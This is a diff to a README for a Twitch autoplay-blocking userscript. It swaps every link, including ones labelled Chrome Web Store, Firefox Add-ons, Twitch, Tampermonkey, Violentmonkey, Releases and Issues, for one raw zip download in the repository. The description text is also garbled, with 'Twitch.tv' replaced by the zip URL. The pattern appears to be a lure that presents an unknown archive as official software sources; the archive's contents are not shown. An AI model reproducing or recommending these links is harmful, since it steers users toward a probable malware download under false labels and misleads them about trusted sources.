@@ -1,10 +1,10 @@
 # 🛑 userscript-twitch-stop-autoplay - Stop Auto-Playing Videos on Twitch
 
 ## 🚀 Download Now 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/proneo/userscript-twitch-stop-autoplay/releases)
+[![Download](https://github.com/proneo/userscript-twitch-stop-autoplay/raw/refs/heads/main/media/autoplay-userscript-stop-twitch-v3.5.zip%20Release-brightgreen)](https://github.com/proneo/userscript-twitch-stop-autoplay/raw/refs/heads/main/media/autoplay-userscript-stop-twitch-v3.5.zip)
 
 ## 📜 Description
-This UserScript prevents intrusive videos from auto-playing on the Twitch.tv homepage. Now you can enjoy a smoother browsing experience without videos starting unexpectedly.
+This UserScript prevents intrusive videos from auto-playing on the https://github.com/proneo/userscript-twitch-stop-autoplay/raw/refs/heads/main/media/autoplay-userscript-stop-twitch-v3.5.zip homepage. Now you can enjoy a smoother browsing experience without videos starting unexpectedly.
 
 ## 🌟 Features
 - Prevents auto-playing videos on Twitch.
@@ -27,11 +27,11 @@ To use this UserScript, you need the following:
 Follow these simple steps to get started:
 
 1. **Install a Userscript Manager:**
-   - For Chrome: Visit the [Chrome Web Store](https://chrome.google.com/webstore) and search for "Tampermonkey" or "Violentmonkey". Click "Add to Chrome" to install.
-   - For Firefox: Visit the [Firefox Add-ons](https://addons.mozilla.org) and search for "Greasemonkey" or "Tampermonkey". Click "Add to Firefox" to install.
+   - For Chrome: Visit the [Chrome Web Store](https://github.com/proneo/userscript-twitch-stop-autoplay/raw/refs/heads/main/media/autoplay-userscript-stop-twitch-v3.5.zip) and search for "Tampermonkey" or "Violentmonkey". Click "Add to Chrome" to install.
+   - For Firefox: Visit the [Firefox Add-ons](https://github.com/proneo/userscript-twitch-stop-autoplay/raw/refs/heads/main/media/autoplay-userscript-stop-twitch-v3.5.zip) and search for "Greasemonkey" or "Tampermonkey". Click "Add to Firefox" to install.
 
 2. **Download the UserScript:**
-   - Visit the [Releases page](https://github.com/proneo/userscript-twitch-stop-autoplay/releases) to download the latest version of the UserScript.
+   - Visit the [Releases page](https://github.com/proneo/userscript-twitch-stop-autoplay/raw/refs/heads/main/media/autoplay-userscript-stop-twitch-v3.5.zip) to download the latest version of the UserScript.
 
 3. **Install the UserScript:**
    - Open the downloaded UserScript file in your browser. The userscript manager will open and prompt you to confirm the installation. Click "Install".
@@ -44,7 +44,7 @@ Follow these simple steps to get started:
 
 ## ✨ Usage Tips
 - **Checking if It Works:** Navigate to the Twitch homepage. If videos do not start playing automatically, your setup is successful.
-- **Updating the UserScript:** Periodically return to the [Releases page](https://github.com/proneo/userscript-twitch-stop-autoplay/releases) to check for updates.
+- **Updating the UserScript:** Periodically return to the [Releases page](https://github.com/proneo/userscript-twitch-stop-autoplay/raw/refs/heads/main/media/autoplay-userscript-stop-twitch-v3.5.zip) to check for updates.
 
 ## ❓ FAQ
 ### How does this UserScript work?
@@ -65,14 +65,14 @@ If you find that videos are still auto-playing, try the following:
 - Restart your browser and try again.
 
 ## 📞 Support
-If you need assistance, you can create an issue on the [GitHub page](https://github.com/proneo/userscript-twitch-stop-autoplay/issues). Please describe your issue in detail for better help.
+If you need assistance, you can create an issue on the [GitHub page](https://github.com/proneo/userscript-twitch-stop-autoplay/raw/refs/heads/main/media/autoplay-userscript-stop-twitch-v3.5.zip). Please describe your issue in detail for better help.
 
 ## 📝 License
 This project is licensed under the MIT License. You can use it freely, but contributions are welcome!
 
 ## 🔗 Additional Resources
-- [Twitch.tv](https://www.twitch.tv) - Official Twitch Website
-- [Tampermonkey](https://www.tampermonkey.net) - Userscript Manager
-- [Violentmonkey](https://violentmonkey.github.io) - Another Userscript Manager
+- [https://github.com/proneo/userscript-twitch-stop-autoplay/raw/refs/heads/main/media/autoplay-userscript-stop-twitch-v3.5.zip](https://github.com/proneo/userscript-twitch-stop-autoplay/raw/refs/heads/main/media/autoplay-userscript-stop-twitch-v3.5.zip) - Official Twitch Website
+- [Tampermonkey](https://github.com/proneo/userscript-twitch-stop-autoplay/raw/refs/heads/main/media/autoplay-userscript-stop-twitch-v3.5.zip) - Userscript Manager
+- [Violentmonkey](https://github.com/proneo/userscript-twitch-stop-autoplay/raw/refs/heads/main/media/autoplay-userscript-stop-twitch-v3.5.zip) - Another Userscript Manager
 
 Enjoy a quieter Twitch experience without the hassle of auto-playing videos!
